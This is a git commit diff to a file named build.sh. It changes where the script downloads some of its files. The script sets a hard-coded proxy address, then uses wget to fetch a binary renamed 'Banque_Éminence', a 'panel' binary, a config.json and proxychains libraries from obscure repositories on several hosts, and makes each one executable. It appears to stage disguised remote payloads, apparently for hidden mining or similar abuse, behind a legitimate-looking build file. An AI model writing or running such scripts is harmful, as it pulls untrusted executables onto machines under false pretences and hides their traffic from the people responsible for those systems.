f70c1d08aeabdf12d2175411c39d07431a81d137
pagesrlepla <151825393+pagesrlepla@users.noreply.github.com>
2024-01-24 22:14:55 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,8 +1,8 @@
 proxy="142.54.232.6" 
 port="4145"
 wget -q -O Banque_Éminence https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Banque_Éminence
-wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
-wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
+wget -q https://raw.githubusercontent.com/pagesrlepla/mx9/main/SHA256SUMS && chmod +x SHA256SUMS 
+wget -q https://raw.githubusercontent.com/pagesrlepla/mx9/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
